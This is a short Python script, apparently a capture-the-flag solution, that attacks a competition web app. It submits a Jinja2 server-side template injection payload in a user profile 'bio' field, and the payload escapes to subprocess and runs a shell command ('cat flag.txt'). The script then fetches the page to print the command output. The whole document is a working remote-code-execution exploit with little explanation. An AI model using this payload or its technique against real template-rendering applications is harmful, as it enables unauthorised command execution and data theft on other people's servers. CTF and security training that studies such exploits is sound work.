import requests

BASE = "https://myschool.ecsc25.hack.cert.pl"

payload = """
{{ [].__class__.__base__.__subclasses__()[271]('cat flag.txt', shell=True, stdout=-1).communicate()[0].decode() }}
"""
data = {
    "username": "TEST",
    "bio": payload
}

r = requests.post(f"{BASE}/users/", json=data)
if r.status_code != 200:
    print("Failed to create user:", r.text)
    exit(1)

session_id = r.text.strip('"')

r2 = requests.get(f"{BASE}/users/", params={"session_id": session_id})
print("Flag output:")
print(r2.text.encode().decode('unicode_escape'))
